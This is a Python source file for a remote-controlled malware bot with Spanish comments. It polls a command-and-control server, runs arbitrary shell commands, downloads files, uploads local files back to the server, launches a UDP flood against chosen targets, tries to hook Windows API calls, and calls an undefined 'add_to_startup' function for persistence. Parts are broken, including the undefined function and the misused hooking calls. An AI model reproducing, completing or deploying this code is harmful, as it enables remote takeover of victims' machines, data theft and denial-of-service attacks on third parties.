import requests
import subprocess
import os
import time
import threading
import socket
import ctypes
import sys
from ctypes import wintypes

add_to_startup(sys.executable + " " + os.path.abspath(__file__))
# Dirección del servidor C2
C2_SERVER = "http://10.0.0.38:5000/command"

# Función para obtener comandos del servidor C2
def fetch_command():
    try:
        response = requests.get(C2_SERVER)
        return response.text
    except requests.RequestException as e:
        print(f"Error al conectar con el servidor C2: {e}")
        return None

# Función para ejecutar comandos recibidos
def execute_command(command):
    if command.startswith("run "):
        subprocess.run(command[4:], shell=True)
    elif command.startswith("download "):
        url = command[9:]
        r = requests.get(url)
        with open("downloaded_file", "wb") as f:
            f.write(r.content)
    elif command.startswith("upload "):
        local_path = command[7:]
        with open(local_path, "rb") as f:
            files = {'file': f}
            response = requests.post("http://10.0.0.38:5000//upload", files=files)
            print(response.text)
    elif command.startswith("exit"):
        os._exit(0)
    elif command.startswith("ddos "):
        parts = command.split()
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        thread = threading.Thread(target=ddos_attack, args=(target, port, duration))
        thread.start()
    # Añade más comandos según sea necesario

# Función de hooking para interceptar llamadas de sistema
def hook_system_call(function_name, new_function):
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    GetProcAddress = kernel32.GetProcAddress
    GetModuleHandleA = kernel32.GetModuleHandleA
    SetWindowsHookExA = user32.SetWindowsHookExA
    CallNextHookEx = user32.CallNextHookEx
    UnhookWindowsHookEx = user32.UnhookWindowsHookEx

    h_module = GetModuleHandleA(None)
    addr = GetProcAddress(h_module, function_name)
    if not addr:
        print(f"Error: No se encontró la función {function_name}")
        return

    # Definir el tipo de la función original
    original_function = ctypes.CFUNCTYPE(None, wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)(addr)

    # Definir el tipo de la nueva función
    new_function_type = ctypes.CFUNCTYPE(None, wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)(new_function)

    # Instalar el hook
    hook_id = SetWindowsHookExA(1, new_function_type, h_module, 0)
    if not hook_id:
        print("Error al instalar el hook")
        return

    print(f"Hook instalado para la función {function_name}")

# Ejemplo de nueva función para el hook
def new_function(hwnd, msg, wparam, lparam):
    print(f"Interceptado mensaje: {msg}")
    CallNextHookEx(None, hwnd, msg, wparam, lparam)

# Instalar el hook para la función "MessageBoxA"
hook_system_call("MessageBoxA", new_function)

# Función para realizar un ataque DDoS
def ddos_attack(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    data = b"AAAAAABBBBBBCCCCCC"

    while time.time() < timeout:
        client.sendto(data, (target, port))

# Bucle principal del malware
while True:
    command = fetch_command()
    if command:
        thread = threading.Thread(target=execute_command, args=(command,))
        thread.start()
    time.sleep(5)  # Espera 5 segundos antes de volver a verificar comandos
